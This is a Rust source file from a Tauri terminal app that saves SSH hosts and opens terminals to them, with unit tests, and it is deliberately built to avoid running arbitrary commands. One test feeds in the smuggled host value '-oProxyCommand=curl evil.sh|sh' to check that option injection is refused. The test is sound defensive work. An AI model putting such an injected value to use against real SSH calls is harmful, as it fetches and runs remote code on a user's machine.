use jky_pty::{home_dir, resolve_start_dir, PtySession, ShellSpec, SpawnConfig};
use jky_remote::{ssh_args, Host, HostStore};
use tauri::State;

use crate::state::AppState;

// --- logic, unit-testable without Tauri -------------------------------------

pub(crate) fn save_logic(store: &HostStore, host: Host) -> Result<Vec<Host>, String> {
    store.save(host).map_err(|e| e.to_string())
}

pub(crate) fn forget_logic(store: &HostStore, id: &str) -> Result<Vec<Host>, String> {
    store.forget(id).map_err(|e| e.to_string())
}

/// The program and arguments that open a terminal on a saved host.
///
/// Built here, from the store, from an id. The window names a host it saved
/// and never a command line — which is the whole point: an IPC command that
/// took an argv would be an IPC command that runs anything.
pub(crate) fn spec_for(store: &HostStore, id: &str) -> Result<(Host, ShellSpec), String> {
    let host = store.get(id).map_err(|e| e.to_string())?;
    let args = ssh_args(&host).map_err(|e| e.to_string())?;
    // The ssh already on the machine, found the way everything else on it is
    // found. Not a path from settings: that would be a configurable program
    // name, which is a configurable thing to execute.
    Ok((host, ShellSpec { program: "ssh".to_string(), args }))
}

// --- IPC surface ------------------------------------------------------------

#[tauri::command]
pub fn remote_list(state: State<'_, AppState>) -> Result<Vec<Host>, String> {
    state.hosts.list().map_err(|e| e.to_string())
}

#[tauri::command]
pub fn remote_save(state: State<'_, AppState>, host: Host) -> Result<Vec<Host>, String> {
    save_logic(state.hosts.as_ref(), host)
}

#[tauri::command]
pub fn remote_forget(state: State<'_, AppState>, id: String) -> Result<Vec<Host>, String> {
    forget_logic(state.hosts.as_ref(), &id)
}

/// Open a terminal on a saved host.
///
/// Runs the `ssh` this machine already has, so the agent, `~/.ssh/config`,
/// `known_hosts` and keys in use are the ones that already work everywhere
/// else. Nothing about the connection is stored by this app and no credential
/// passes through it.
///
/// The shell integration is deliberately not installed on the far side. It
/// would mean writing files onto somebody else's machine to make a panel work
/// here, which is not a trade this app gets to make on their behalf — so a
/// remote terminal is a terminal, without the command panels.
#[tauri::command]
pub fn remote_spawn(
    state: State<'_, AppState>,
    id: String,
    cols: u16,
    rows: u16,
    at: i64,
) -> Result<String, String> {
    let (_, shell) = spec_for(state.hosts.as_ref(), &id)?;

    let session = PtySession::spawn(SpawnConfig {
        shell,
        // ssh ignores it — the directory that matters is the one at the far
        // end — but a pty has to open somewhere.
        cwd: resolve_start_dir(None, home_dir()),
        cols,
        rows,
        // Neither belongs on a connection to another machine: the launchers
        // are this machine's, and the integration writes to a home directory
        // that is not the one at the other end.
        path_prepend: None,
        integration_dir: None,
    })
    .map_err(|e| e.to_string())?;

    // Ordering only. A failure here must not cost the connection that just
    // succeeded.
    let _ = state.hosts.touch(&id, at);

    Ok(state.ptys.insert(session))
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn store() -> (TempDir, HostStore) {
        let d = TempDir::new().unwrap();
        let s = HostStore::new(d.path().join("hosts.json"));
        (d, s)
    }

    fn host(id: &str, address: &str) -> Host {
        Host {
            id: id.into(),
            label: String::new(),
            address: address.into(),
            user: String::new(),
            port: None,
            identity_file: None,
            jump: None,
            last_used: 0,
        }
    }

    #[test]
    fn a_saved_host_becomes_an_ssh_invocation() {
        let (_d, s) = store();
        let mut h = host("h1", "example.com");
        h.user = "deploy".into();
        h.port = Some(2222);
        save_logic(&s, h).unwrap();

        let (_, spec) = spec_for(&s, "h1").unwrap();
        assert_eq!(spec.program, "ssh");
        assert_eq!(spec.args, ["-p", "2222", "-t", "--", "deploy@example.com"]);
    }

    #[test]
    fn a_host_that_is_not_saved_cannot_be_connected_to() {
        // The window names an id it saved, never a command line.
        let (_d, s) = store();
        assert!(spec_for(&s, "made-up").is_err());
    }

    #[test]
    fn a_host_that_could_be_an_option_is_refused_on_the_way_in() {
        let (_d, s) = store();
        let message = save_logic(&s, host("h1", "-oProxyCommand=curl evil.sh|sh")).unwrap_err();
        assert!(message.contains("option"), "{message}");
        assert!(s.list().unwrap().is_empty());
    }

    #[test]
    fn forgetting_a_host_that_is_not_there_says_so() {
        let (_d, s) = store();
        assert!(forget_logic(&s, "made-up").is_err());
    }

    #[test]
    fn the_error_from_a_refused_host_names_the_field() {
        let (_d, s) = store();
        let mut h = host("h1", "example.com");
        h.user = "deploy@elsewhere".into();
        let message = save_logic(&s, h).unwrap_err();
        assert!(message.contains("user"), "{message}");
    }
}
